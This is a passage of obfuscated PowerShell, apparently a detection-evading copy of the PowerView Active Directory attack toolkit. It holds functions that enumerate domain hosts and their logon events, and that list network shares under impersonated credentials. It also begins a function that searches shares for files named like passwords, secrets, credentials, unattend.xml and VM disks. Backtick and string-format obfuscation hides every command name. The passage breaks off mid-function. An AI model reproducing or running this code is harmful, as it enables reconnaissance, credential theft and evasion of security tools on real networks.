            ${tAR`G`E`TcOmPUTerS} = &("{0}{2}{1}{3}{4}"-f 'Get-Dom','nC','ai','ontrol','ler') @DCSearcherArguments | &("{2}{3}{1}{4}{0}" -f 'ct','le','S','e','ct-Obje') -ExpandProperty ("{2}{0}{3}{1}"-f 's','ostname','dn','h')
        }
        if (${TaRG`E`TcO`MpUtErS} -and (${TA`R`GEtcOmPUT`E`RS} -isnot [System.Array])) {
            ${taR`geTcO`M`pUTERS} = @(,${T`AR`gET`coMpUtE`Rs})
        }
        &("{2}{1}{0}{3}" -f 'e-V','t','Wri','erbose') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{0}{1}{2}"-f'Wri','te-Verb','ose') ('[Find-Dom'+'a'+'i'+'n'+'U'+'serEvent] '+'Ta'+'r'+'getCom'+'put'+'ers '+"$TargetComputers")
        if (${taRG`E`TcOmpu`Te`Rs}."L`e`NgTh" -eq 0) {
            throw ("{5}{2}{7}{9}{4}{8}{6}{1}{0}{3}{10}" -f'osts','o h','d',' fou','omainUserEve','[Fin','N','-','nt] ','D','nd to enumerate')
        }

        
        ${ho`sTE`NuMbLOCk} = {
            Param(${coMPu`Te`RnA`mE}, ${STa`R`TTiME}, ${endTi`mE}, ${MaXEve`N`Ts}, ${TA`RG`eTUse`Rs}, ${f`IltEr}, ${Cr`EDE`N`TiAL})

            ForEach (${tARG`etC`O`MpU`TER} in ${CompU`TeRnA`mE}) {
                ${UP} = &("{3}{2}{0}{1}"-f 'ct','ion','est-Conne','T') -Count 1 -Quiet -ComputerName ${TarGeT`CoMpu`Ter}
                if (${U`P}) {
                    ${domain`Use`REV`eNTargs} = @{
                        ("{2}{3}{0}{1}"-f 'terNam','e','Com','pu') = ${T`ArgeT`c`OmPUter}
                    }
                    if (${ST`ArTT`imE}) { ${D`oMa`iNUSErEvENT`Args}[("{2}{1}{0}" -f'tTime','r','Sta')] = ${stA`Rt`TIMe} }
                    if (${end`T`ImE}) { ${D`OM`AiNUseREve`NTaRgs}[("{0}{1}"-f'E','ndTime')] = ${en`D`TIme} }
                    if (${m`A`Xeven`TS}) { ${DOmA`INu`sErevE`NT`AR`Gs}[("{1}{0}{2}" -f'n','MaxEve','ts')] = ${maX`EVEn`TS} }
                    if (${C`RedE`N`TiaL}) { ${doma`inu`sE`Rev`EnTaRGS}[("{1}{0}{2}{3}"-f'rede','C','ntia','l')] = ${credE`N`TIal} }
                    if (${fI`lTer} -or ${Ta`R`gEtuS`ers}) {
                        if (${T`ArGeT`USeRs}) {
                            &("{6}{5}{1}{0}{3}{4}{2}" -f'er','mainUs','t','E','ven','Do','Get-') @DomainUserEventArgs | &("{0}{3}{2}{1}"-f'Wh','ct','Obje','ere-') {${tArgE`TusE`Rs} -contains ${_}."T`ARge`TUS`ErN`AME"}
                        }
                        else {
                            ${o`PERATor} = 'or'
                            ${fiLt`Er}."k`eyS" | &("{4}{0}{2}{3}{1}"-f 'Ea','ect','ch-O','bj','For') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{0}{2}{1}"-f'O','tor','pera')) -or (${_} -eq ("{0}{1}{2}" -f'Ope','r','ation'))) {
                                    if ((${fil`T`Er}[${_}] -match '&') -or (${f`iLTER}[${_}] -eq 'and')) {
                                        ${OpER`AT`oR} = 'and'
                                    }
                                }
                            }
                            ${K`eys} = ${fiL`TER}."ke`ys" | &("{0}{1}{2}" -f'W','h','ere-Object') {(${_} -ne 'Op') -and (${_} -ne ("{1}{2}{0}" -f 'ator','O','per')) -and (${_} -ne ("{2}{0}{1}" -f'at','ion','Oper'))}
                            &("{4}{0}{5}{2}{1}{3}" -f 'et-D','rEv','ainUse','ent','G','om') @DomainUserEventArgs | &("{0}{2}{3}{1}" -f 'F','bject','orEa','ch-O') {
                                if (${OPErA`T`OR} -eq 'or') {
                                    ForEach (${k`eY} in ${kE`Ys}) {
                                        if (${_}."$Key" -match ${fi`lT`ER}[${K`ey}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${K`eY} in ${KE`ys}) {
                                        if (${_}."$Key" -notmatch ${fiLT`Er}[${K`EY}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{4}{3}{1}{0}{2}"-f 'E','r','vent','inUse','Get-Doma') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${psBOu`N`dpaRAMEt`ers}[("{0}{1}"-f'Dela','y')] -or ${PSB`OU`ND`pA`RaMeTErS}[("{2}{0}{1}" -f'e','ss','StopOnSucc')]) {

            &("{3}{0}{1}{2}" -f'rite','-Ve','rbose','W') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{1}{3}{2}{0}"-f 'se','Wr','e-Verbo','it') ('[Find-D'+'om'+'a'+'i'+'n'+'Use'+'rEve'+'nt] '+'Del'+'a'+'y: '+"$Delay, "+'Jit'+'ter: '+"$Jitter")
            ${cOu`NteR} = 0
            ${rA`Nd`No} = &("{0}{2}{1}"-f'New-O','ject','b') ("{2}{1}{0}{3}"-f 'a','m.R','Syste','ndom')

            ForEach (${TaRgeTco`m`p`U`Ter} in ${t`ARGeTCO`m`PuT`Ers}) {
                ${c`OUnt`er} = ${CO`UntEr} + 1

                
                &("{2}{1}{0}" -f'leep','art-S','St') -Seconds ${raN`DNO}.("{0}{1}"-f 'Nex','t').Invoke((1-${JIt`T`er})*${D`E`lay}, (1+${jIt`TeR})*${Del`Ay})

                &("{4}{1}{0}{3}{2}" -f'e','-V','bose','r','Write') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${r`eSUlt} = &("{0}{1}{4}{3}{2}"-f'Inv','ok','mmand','Co','e-') -ScriptBlock ${ho`STe`N`UmBL`oCK} -ArgumentList ${T`Arget`c`ompuTer}, ${s`Ta`RTTIme}, ${enD`T`iMe}, ${m`Axe`VENTS}, ${TARG`EtU`Se`Rs}, ${f`il`TEr}, ${Cr`EDe`N`TIal}
                ${ReS`ULt}

                if (${rESu`LT} -and ${sTOpo`NsU`cC`esS}) {
                    &("{1}{2}{0}"-f 'erbose','Wr','ite-V') ("{5}{11}{6}{1}{14}{9}{16}{8}{13}{7}{0}{3}{4}{12}{2}{10}{15}" -f'u','in','urni','ser fou','nd','[F','ma','get ','ent]','r','ng ','ind-Do',', ret',' Tar','Use','early','Ev')
                    return
                }
            }
        }
        else {
            &("{0}{3}{2}{1}"-f 'Wr','erbose','te-V','i') ('[Find'+'-D'+'omainUserEve'+'nt] '+'Using'+' '+'t'+'hre'+'ading '+'with'+' '+'t'+'hr'+'eads:'+' '+"$Threads")

            
            ${S`CriP`T`PAR`AmS} = @{
                ("{0}{1}{2}"-f 'S','tartT','ime') = ${sT`A`RTTImE}
                ("{2}{1}{0}" -f'ime','ndT','E') = ${E`Nd`TIME}
                ("{2}{1}{0}" -f'vents','E','Max') = ${M`A`xe`VENtS}
                ("{2}{3}{0}{1}" -f 'r','s','Tar','getUse') = ${t`ARG`ETuSErs}
                ("{0}{1}" -f 'Fi','lter') = ${F`iltER}
                ("{0}{1}{3}{2}"-f'C','redenti','l','a') = ${c`RedE`N`TIaL}
            }

            
            &("{3}{1}{0}{5}{4}{2}"-f 'Threade','ew-','tion','N','nc','dFu') -ComputerName ${ta`Rg`ET`Com`PUteRS} -ScriptBlock ${ho`sT`en`UMblock} -ScriptParameters ${sCRiP`TPaR`AMs} -Threads ${thR`EADs}
        }
    }
}


function FI`ND`-doMaiN`SHare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f'ouldProc','P','ess','SSh'}, '')]
    [OutputType({"{3}{2}{4}{0}{5}{1}" -f'ew.Shar','nfo','rV','Powe','i','eI'})]
    Param(
        [Parameter(PosITiON = 0, valUEFrOmpIPELINE = ${T`RUe}, VaLUEfRoMPIpelInEbyPrOpERTyNAmE = ${TR`Ue})]
        [Alias({"{0}{2}{1}" -f'DNSH','tName','os'})]
        [String[]]
        ${Co`MP`UTe`Rname},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'om','D','ain'})]
        [String]
        ${coMp`UtE`R`dOM`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COm`p`U`TEr`L`DaPfiLter},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMp`UTE`RSeaRChb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{4}{2}"-f'ati','Op','em','er','ngSyst'})]
        [String]
        ${Co`MpUTeropeRa`Ti`Ngs`YSt`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}"-f 'r','ck','vicePa','Se'})]
        [String]
        ${coM`PUTEr`sE`RVIC`EpACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'e','S','iteNam'})]
        [String]
        ${co`mpute`RSI`TenAME},

        [Alias({"{1}{0}{3}{2}"-f 'eck','Ch','cess','Ac'})]
        [Switch]
        ${cHEC`KsHA`R`EaCcE`Ss},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{1}{0}{3}"-f 'ontr','C','Dom','oller','ain'})]
        [String]
        ${s`ErvER},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{1}{2}"-f 'On','eL','evel'}, {"{0}{1}"-f 'Subtr','ee'})]
        [String]
        ${sE`Arc`HSC`opE} = ("{0}{1}"-f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`S`UltPA`gEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvERTi`m`e`LiMIt},

        [Switch]
        ${TOmbS`To`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`e`NtIAL} =   ${Q`Fn}::"eMp`Ty",

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`LAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jItt`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`hr`eaDS} = 20
    )

    BEGIN {

        ${co`mputErsearchEraRgum`e`N`Ts} = @{
            ("{3}{1}{2}{0}" -f 'ies','r','opert','P') = ("{0}{2}{1}" -f'dn','name','shost')
        }
        if (${pSBOu`NDpaRa`M`etE`RS}[("{3}{1}{2}{0}"-f'in','puterD','oma','Com')]) { ${comp`UTE`R`seA`RcH`ErA`RgUMeNts}[("{2}{0}{1}" -f'i','n','Doma')] = ${c`oMP`UterDo`MA`In} }
        if (${PsB`ouNDPAR`A`METE`RS}[("{0}{1}{3}{2}" -f'Co','mp','Filter','uterLDAP')]) { ${COMputErSEaR`c`he`RARg`Um`ENTS}[("{3}{1}{0}{2}"-f 'l','i','ter','LDAPF')] = ${c`O`mPUtErLDaPFiLt`er} }
        if (${pS`BO`UN`dpa`RamET`ers}[("{0}{4}{3}{1}{2}{5}"-f'Compu','earc','h','S','ter','Base')]) { ${Co`mP`Ut`erSearcHEr`A`RguM`enTS}[("{0}{2}{3}{1}" -f'Se','ase','a','rchB')] = ${co`MPuTE`Rsea`R`C`HBaSE} }
        if (${psBO`UNDp`ARA`Mete`Rs}[("{2}{1}{0}"-f 'ned','strai','Uncon')]) { ${cOMPu`T`erseARC`h`EraRGU`MEN`TS}[("{0}{2}{1}" -f'Un','ained','constr')] = ${Unc`On`STRAinED} }
        if (${pSBOUn`dpAr`AMe`Te`Rs}[("{3}{2}{0}{1}" -f 'ing','System','at','ComputerOper')]) { ${cOmpUtErSEA`RcheRAR`GU`MEn`Ts}[("{3}{1}{2}{0}{4}"-f'st','pera','tingSy','O','em')] = ${oPEr`A`Tin`gsY`steM} }
        if (${ps`BoU`N`dP`ArAME`TerS}[("{0}{1}{2}{3}"-f'C','ompu','terService','Pack')]) { ${cOmpU`TeRSEArch`erArG`UmeN`TS}[("{0}{1}{2}" -f 'S','erv','icePack')] = ${Se`RVi`cePACk} }
        if (${PS`BoundpARAm`E`TErs}[("{0}{1}{2}{3}" -f 'Co','mputerS','iteNam','e')]) { ${Co`mPuTeRseaR`CHE`Rar`GuMeNts}[("{1}{0}{2}" -f'teN','Si','ame')] = ${SiTe`NA`Me} }
        if (${p`sBO`UNDPAR`AmEte`Rs}[("{0}{1}{2}" -f 'Se','r','ver')]) { ${C`OmpU`TeR`SeARCH`e`RaRgUmE`Nts}[("{0}{1}"-f'Se','rver')] = ${seRV`ER} }
        if (${P`sbOUNd`P`ArAmE`TERs}[("{0}{2}{1}" -f 'Sear','pe','chSco')]) { ${com`p`UtEr`sEAr`CHerARgUM`EnTS}[("{1}{3}{0}{2}" -f 'hScop','Sea','e','rc')] = ${se`A`RCHsCoPE} }
        if (${pSBou`Ndp`ARa`MeT`E`Rs}[("{2}{3}{1}{0}"-f 'e','tPageSiz','Resu','l')]) { ${coMpU`TE`RS`EaRch`ERArgUmEN`Ts}[("{0}{1}{2}"-f'ResultP','age','Size')] = ${re`s`UL`TPag`eSizE} }
        if (${psBO`Undp`ARA`mEt`eRS}[("{3}{1}{2}{0}"-f 'it','rTimeL','im','Serve')]) { ${c`OMPutErS`E`ARCHERARG`UmE`Nts}[("{2}{3}{0}{1}" -f'rTi','meLimit','Serv','e')] = ${seR`VERt`iMELimiT} }
        if (${p`sb`OUn`dpArAm`e`TeRs}[("{2}{1}{0}" -f'one','bst','Tom')]) { ${C`oMpu`TE`RseA`RCHerARGUmENts}[("{0}{2}{1}" -f'To','tone','mbs')] = ${TOmB`sT`o`NE} }
        if (${pSbO`U`N`DparAmeTE`Rs}[("{2}{0}{1}" -f 'ti','al','Creden')]) { ${COmP`U`T`E`R`searCherArGumEntS}[("{1}{2}{0}" -f'l','Cre','dentia')] = ${cR`E`deNTiaL} }

        if (${psB`OuNDParAmeT`E`Rs}[("{2}{1}{0}" -f'erName','ut','Comp')]) {
            ${Ta`R`G`eTcO`mPUtERs} = ${COmPUtER`N`A`Me}
        }
        else {
            &("{4}{3}{1}{0}{2}"-f 'erbos','V','e','-','Write') ("{11}{0}{5}{3}{4}{9}{7}{1}{2}{10}{6}{8}"-f'i','] Query','ing ','-Dom','ainSh','nd',' ','e','the domain','ar','computers in','[F')
            ${tarGET`c`oMPu`T`ERs} = &("{0}{3}{2}{4}{5}{1}"-f'G','ter','t-Doma','e','inCo','mpu') @ComputerSearcherArguments | &("{1}{2}{0}" -f't','S','elect-Objec') -ExpandProperty ("{0}{1}{2}" -f'dnshost','n','ame')
        }
        &("{2}{0}{3}{1}"-f'te-','erbose','Wri','V') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${TArgETcOM`p`Ut`Ers}."lEN`G`TH" -eq 0) {
            throw ("{7}{6}{8}{0}{2}{4}{1}{3}{5}"-f'i','o ho','nSh','sts found to e','are] N','numerate','Find-','[','Doma')
        }

        
        ${H`ost`E`NuM`BLOck} = {
            Param(${COM`pU`T`ERNaME}, ${chE`c`K`sHaReACcEss}, ${to`KEnhAnD`LE})

            if (${t`oKenHAnd`lE}) {
                
                ${N`Ull} = &("{4}{0}{3}{1}{6}{2}{5}"-f'nvoke-U','pe','son','serIm','I','ation','r') -TokenHandle ${T`OKENh`AndlE} -Quiet
            }

            ForEach (${Targ`e`T`coMPUTer} in ${cO`MP`UTernAme}) {
                ${up} = &("{4}{2}{3}{1}{0}"-f 'ion','t','on','nec','Test-C') -Count 1 -Quiet -ComputerName ${t`ArgE`TCOm`pUtER}
                if (${u`P}) {
                    
                    ${sHa`R`es} = &("{3}{0}{2}{1}"-f 'e','NetShare','t-','G') -ComputerName ${Ta`R`g`ETco`mpUteR}
                    ForEach (${SHa`Re} in ${S`HAR`es}) {
                        ${S`HaR`eN`AMe} = ${s`HArE}."na`mE"
                        
                        ${p`AtH} = '\\'+${T`Arg`E`TCo`mpuTEr}+'\'+${S`Har`enAmE}

                        if ((${shAR`eN`Ame}) -and (${ShA`REN`AmE}.("{0}{1}"-f'tri','m').Invoke() -ne '')) {
                            
                            if (${chECk`s`H`AReAcCESS}) {
                                
                                try {
                                    ${N`ULl} =   (  vARiABLE ("{1}{0}" -f '1eUP','G')  -vALUEON )::("{1}{2}{0}"-f 'les','G','etFi').Invoke(${p`ATh})
                                    ${s`HARe}
                                }
                                catch {
                                    &("{2}{1}{0}{3}"-f 'e-Verb','rit','W','ose') ('Erro'+'r '+'accessin'+'g'+' '+'s'+'hare '+'p'+'ath '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${s`haRe}
                            }
                        }
                    }
                }
            }

            if (${tok`eN`HAndLe}) {
                &("{0}{4}{5}{1}{3}{2}" -f'Invoke-','To','elf','S','R','evert')
            }
        }

        ${Lo`GO`NTOKeN} = ${Nu`lL}
        if (${P`SBoUn`d`parAM`ETE`RS}[("{2}{1}{0}"-f'tial','reden','C')]) {
            if (${P`sB`OunDpar`AM`eT`ErS}[("{1}{0}" -f 'lay','De')] -or ${psboU`NDp`A`RaMeTERs}[("{2}{3}{0}{1}"-f'nSucc','ess','Sto','pO')]) {
                ${LO`GoNT`oK`eN} = &("{6}{1}{0}{2}{4}{5}{3}" -f 'k','vo','e','n','-UserImperson','atio','In') -Credential ${cre`dEN`Ti`AL}
            }
            else {
                ${l`oGon`ToKen} = &("{0}{4}{2}{3}{1}" -f'Invoke-','on','erImper','sonati','Us') -Credential ${c`RE`d`EntiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${Ps`BouNdpa`RAMET`e`Rs}[("{0}{1}"-f'Dela','y')] -or ${pSbOU`NDpArAm`Ete`RS}[("{0}{2}{1}"-f 'Stop','s','OnSucces')]) {

            &("{0}{4}{2}{1}{3}" -f'W','V','e-','erbose','rit') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{2}{1}{0}" -f'erbose','ite-V','Wr') ('[Find'+'-Do'+'ma'+'inShare'+'] '+'Del'+'ay: '+"$Delay, "+'Ji'+'tt'+'er: '+"$Jitter")
            ${cOuNT`Er} = 0
            ${R`ANd`NO} = &("{3}{0}{1}{2}" -f 'e','w-Ob','ject','N') ("{3}{0}{2}{1}{4}"-f'tem','n','.Ra','Sys','dom')

            ForEach (${t`Arg`e`TC`omPuTEr} in ${t`Arg`eTc`omPUt`eRs}) {
                ${counT`ER} = ${COUn`T`Er} + 1

                
                &("{2}{1}{0}" -f 'leep','tart-S','S') -Seconds ${rA`NdNo}.("{1}{0}" -f 'xt','Ne').Invoke((1-${JiT`TER})*${d`ElAY}, (1+${jI`TTer})*${d`eLay})

                &("{1}{0}{3}{4}{2}"-f 'Ve','Write-','e','rbo','s') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{4}{2}{3}{0}" -f'mmand','I','ke','-Co','nvo') -ScriptBlock ${HoS`T`e`NUmBLOCk} -ArgumentList ${tAR`g`eTco`MpUt`Er}, ${Ch`ECksHaR`e`Acc`E`Ss}, ${l`Ogo`NtOKeN}
            }
        }
        else {
            &("{2}{1}{3}{0}" -f'bose','rite','W','-Ver') ('[Fin'+'d-D'+'om'+'a'+'in'+'Sha'+'re] '+'Usin'+'g '+'thre'+'ad'+'ing '+'with'+' '+'threa'+'ds'+': '+"$Threads")

            
            ${scr`i`PtpAraMS} = @{
                ("{0}{1}{2}"-f 'CheckShar','e','Access') = ${CHeCkSH`AreA`cce`Ss}
                ("{2}{0}{1}{3}"-f 'kenHa','nd','To','le') = ${l`OgoNT`Ok`EN}
            }

            
            &("{4}{2}{0}{1}{3}"-f 'ti','o','ew-ThreadedFunc','n','N') -ComputerName ${TARGetC`o`mpUt`ERs} -ScriptBlock ${hoSten`UMbl`ock} -ScriptParameters ${scr`iP`Tp`ARAmS} -Threads ${t`hReaDS}
        }
    }

    END {
        if (${L`OgoNtO`Ken}) {
            &("{4}{3}{2}{1}{0}"-f'lf','oSe','ke-RevertT','vo','In') -TokenHandle ${L`oGOnT`oken}
        }
    }
}


function FIn`D-I`NTeR`E`StIN`Gdom`AinSHA`Re`FIlE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f'houldPr','P','ocess','SS'}, '')]
    [OutputType({"{5}{0}{1}{2}{6}{4}{3}"-f'ow','e','rVi','ile','w.FoundF','P','e'})]
    [CmdletBinding(DEfaULTpArAmeteRsEtNaME = {"{1}{2}{3}{0}{4}"-f 'cificati','Fi','leSp','e','on'})]
    Param(
        [Parameter(positIoN = 0, VaLUEfrOmPiPEliNE = ${t`Rue}, VALuEFRomPIPElIneBypRoperTyNaMe = ${Tr`Ue})]
        [Alias({"{3}{2}{1}{0}" -f 'e','tNam','os','DNSH'})]
        [String[]]
        ${cOmpuT`ERn`A`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`o`MP`UTERDomA`In},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMpu`Terl`DaP`FILT`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPut`E`Rs`earchBA`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{4}{0}{2}"-f 'ingSys','O','tem','p','erat'})]
        [String]
        ${co`MpUt`eroPE`RAt`InGSy`sTeM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'Pack','ice','Serv'})]
        [String]
        ${Comp`UT`ERsE`RviCePA`ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'eNam','Sit','e'})]
        [String]
        ${cOmPuTeRs`It`e`NaMe},

        [Parameter(pARaMETErSeTNaME = "FilE`SpecIfiCA`T`i`on")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f 'hT','e','rms','Searc'}, {"{1}{0}" -f's','Term'})]
        [String[]]
        ${in`CLU`DE} = @(("{0}{1}{2}"-f '*passw','o','rd*'), ("{1}{2}{0}{3}" -f't','*','sensi','ive*'), ("{0}{1}" -f '*','admin*'), ("{1}{0}" -f 'login*','*'), ("{0}{2}{1}"-f '*secr','t*','e'), ("{2}{0}{1}{3}" -f 'ttend*','.xm','una','l'), ("{1}{0}"-f 'vmdk','*.'), ("{1}{0}"-f 'eds*','*cr'), ("{1}{0}{3}{2}"-f'ede','*cr','al*','nti'), ("{2}{0}{1}" -f'c','onfig','*.')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{2}{1}{0}{4}{3}" -f 'wO','NwON','wO','wON','N'))-rEPLace([CHAr]119+[CHAr]79+[CHAr]78),[CHAr]92})]
        [Alias({"{1}{0}" -f 'are','Sh'})]
        [String[]]
        ${s`H`A`RePaTh},

        [String[]]
        ${eX`CLU`d`EDS`hareS} = @('C$', (('Adm'+'in'+'{0'+'}') -f [chAR]36), (('Print'+'{0}')  -F[cHaR]36), (('IPC{'+'0}')  -F  [CHAr]36)),

        [Parameter(PARAMETersETnAme = "FI`lES`pEc`ifIcATion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${L`AstACCE`S`ST`imE},

        [Parameter(pArAmETersEtNaME = "f`ILeSp`EcIfI`cATiON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LA`sTWrITE`TIME},

        [Parameter(paRAMETeRSEtNamE = "FiLeSpEcI`FIC`AT`Ion")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cre`AtIo`NTIME},

        [Parameter(PARaMetErsEtnAme = "oF`F`ICed`OCS")]
        [Switch]
        ${of`F`ice`DOcs},

        [Parameter(pArAMeTERSeTNAme = "FrE`SH`eXeS")]
        [Switch]
        ${frEs`HeX`es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{0}{3}{2}" -f 'o','ainC','r','ntrolle','Dom'})]
        [String]
        ${se`RVER},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{0}{1}" -f 'OneL','evel'}, {"{0}{1}{2}" -f 'Subt','re','e'})]
        [String]
        ${se`ARCH`SCO`pe} = ("{1}{0}{2}"-f't','Sub','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResU`ltP`A`gES`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RV`eRTime`limit},

        [Switch]
        ${To`mB`stONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDe`Nt`IAL} =  (gi ("{1}{0}{2}{3}"-f 'ABl','VArI','E:q','fn')  )."VA`lUE"::"em`ptY",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`eLaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jIt`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`HrEaDS} = 20
    )

    BEGIN {
        ${CO`mPU`TERSEarcherA`RG`UmenTs} = @{
            ("{2}{0}{1}{3}"-f'oper','t','Pr','ies') = ("{2}{1}{0}"-f 'e','am','dnshostn')
        }
        if (${PsBoUNd`paRAmE`Te`Rs}[("{3}{0}{2}{1}"-f 'rD','main','o','Compute')]) { ${c`oMPU`T`eRsEar`Ch`ERArGUMENtS}[("{1}{0}"-f 'main','Do')] = ${cO`MPUt`ErdOmaIn} }
        if (${PsB`ouNDp`ARAME`TERs}[("{2}{0}{1}{3}{4}{5}"-f'pu','t','Com','er','LDAP','Filter')]) { ${Co`M`PuTe`RseaR`chErarg`Ume`NtS}[("{2}{1}{0}"-f 'ter','Fil','LDAP')] = ${CoMput`eR`LDAP`F`iLTer} }
        if (${pSboUNdPa`Ra`ME`TeRs}[("{3}{2}{4}{1}{0}" -f'e','hBas','puterSear','Com','c')]) { ${Compu`TeRseARC`herAr`guMEN`TS}[("{0}{1}{2}"-f 'Search','Bas','e')] = ${cOMPU`TErsEA`R`ChbasE} }
        if (${pSbo`Undp`A`RamETERs}[("{0}{3}{2}{1}{4}"-f'Computer','Syst','g','Operatin','em')]) { ${COmPut`ERSe`ArchEr`ARgum`ENTs}[("{0}{1}{2}" -f 'Operatin','gSyste','m')] = ${O`perAt`InG`syStEM} }
        if (${pSBouNdp`Ar`Am`eTE`RS}[("{2}{4}{5}{1}{0}{3}"-f'c','cePa','Compu','k','terS','ervi')]) { ${CoMPUTErS`ea`R`Che`RArgumenTs}[("{2}{1}{3}{0}" -f'ck','erviceP','S','a')] = ${SERV`iCeP`A`cK} }
        if (${P`SBo`UnDpaRA`mET`eRs}[("{1}{3}{0}{2}" -f 'pu','Co','terSiteName','m')]) { ${comPuteRs`e`Ar`CHe`RargUme`NtS}[("{0}{1}" -f'Site','Name')] = ${S`ITe`N`AmE} }
        if (${PSbOU`NDparAm`e`Te`Rs}[("{0}{1}"-f'Ser','ver')]) { ${CoMputE`R`se`ArcHer`ARg`U`MEnts}[("{0}{1}" -f'Ser','ver')] = ${s`ERveR} }
        if (${PSbo`UndP`Ar`AMet`eRS}[("{0}{1}{2}" -f 'Se','archSco','pe')]) { ${co`M`PUte`RSeaR`cH`eRA`RGUMeNTS}[("{1}{2}{0}" -f'cope','Sear','chS')] = ${sear`Chsc`oPE} }
        if (${PSbO`UND`p`Ara`mEters}[("{2}{0}{1}{3}" -f'l','t','Resu','PageSize')]) { ${COMpuTE`RS`E`ARC`herarg`UMENTs}[("{0}{1}{3}{2}" -f'Re','sult','geSize','Pa')] = ${reS`UlTPa`g`eSIzE} }
        if (${PS`B`o`UNDP`A`RAmEteRs}[("{0}{3}{2}{1}"-f'S','meLimit','rTi','erve')]) { ${cOmpuTerSEAR`Ch`e`R`A`RGu`M`ENtS}[("{1}{3}{0}{2}" -f 'Tim','Ser','eLimit','ver')] = ${Se`RVerTIMe`LI`mIT} }
        if (${PSBO`UndpA`RAME`TeRS}[("{1}{0}{2}"-f 'on','Tombst','e')]) { ${C`omP`UteR`seARCHer`ARgU`M`EN`Ts}[("{1}{2}{0}" -f 'e','Tombs','ton')] = ${t`ombsTo`Ne} }
        if (${ps`Boun`d`pA`RA`meTeRs}[("{1}{0}{2}"-f 'eden','Cr','tial')]) { ${coMp`U`T`ERsE`A`RcHErA`RgumeNTs}[("{2}{3}{1}{0}"-f'tial','n','Cre','de')] = ${CR`E`DENtiAl} }

        if (${p`sBOU`NDPAR`AME`TE`RS}[("{3}{0}{1}{2}"-f 'om','puter','Name','C')]) {
            ${taRgEtco`m`puT`Ers} = ${C`Om`PuTErNAmE}
        }
        else {
            &("{1}{0}{2}{3}" -f'rite-Ve','W','rbo','se') ("{14}{16}{5}{6}{19}{4}{9}{8}{18}{1}{15}{10}{0}{2}{17}{7}{3}{11}{12}{13}" -f 'ute','in','rs','th','ma','Intere','sti',' ','er','inShareFile] Qu','p','e do','mai','n','[Fin','g com','d-',' in','y','ngDo')
            ${Targ`eTc`O`mPuT`ERS} = &("{4}{3}{0}{1}{2}" -f'in','C','omputer','t-Doma','Ge') @ComputerSearcherArguments | &("{2}{1}{3}{0}"-f 'bject','e','S','lect-O') -ExpandProperty ("{3}{0}{1}{2}" -f 'ho','stna','me','dns')
        }
        &("{1}{3}{2}{0}"-f'bose','Writ','Ver','e-') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${ta`RGetC`oMPu`TE`Rs}."LE`NGtH" -eq 0) {
            throw ("{4}{3}{10}{0}{6}{5}{14}{9}{11}{7}{1}{8}{16}{12}{15}{13}{2}" -f'rest','s fo','e','t','[Find-In','DomainShar','ing','t','und ','Fil','e','e] No hos','enumer','t','e','a','to ')
        }

        
        ${H`oSt`en`UMB`LOCK} = {
            Param(${COmPUTe`R`NA`Me}, ${i`NC`luDe}, ${e`xcl`UdE`DSH`Ares}, ${OFF`I`cEDO`Cs}, ${ExC`L`UDe`HIDd`EN}, ${frES`he`XES}, ${cH`ecKwRiTE`Acce`SS}, ${tOke`NHAnd`LE})

            if (${T`oKenha`ND`lE}) {
                
